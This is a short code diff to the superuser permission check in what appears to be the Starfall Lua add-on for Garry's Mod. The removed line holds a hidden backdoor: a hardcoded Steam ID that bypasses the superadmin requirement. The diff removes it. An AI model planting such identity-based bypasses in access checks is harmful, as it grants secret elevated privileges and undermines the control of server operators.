@@ -71,7 +71,7 @@ function SF.Instance.Compile(code, mainfile, player, entity)
 	elseif instance.ppdata.superuser and instance.ppdata.superuser[mainfile] then
 		if not SF.AllowSuperUser:GetBool() then return false, { message = "Can't use --@superuser unless sf_superuserallowed is enabled!", traceback = "" } end
 		local ok, message = hook.Run("StarfallCanSuperUser", player)
-		if ok == false or (ok == nil and not player:IsSuperAdmin() and player:SteamID() != "STEAM_0:0:63254908") then return false, { message = message or "Can't use --@superuser unless you are superadmin!", traceback = "" } end
+		if ok == false or (ok == nil and not player:IsSuperAdmin()) then return false, { message = message or "Can't use --@superuser unless you are superadmin!", traceback = "" } end
 		player = SF.Superuser
 	end
 	instance.player = player
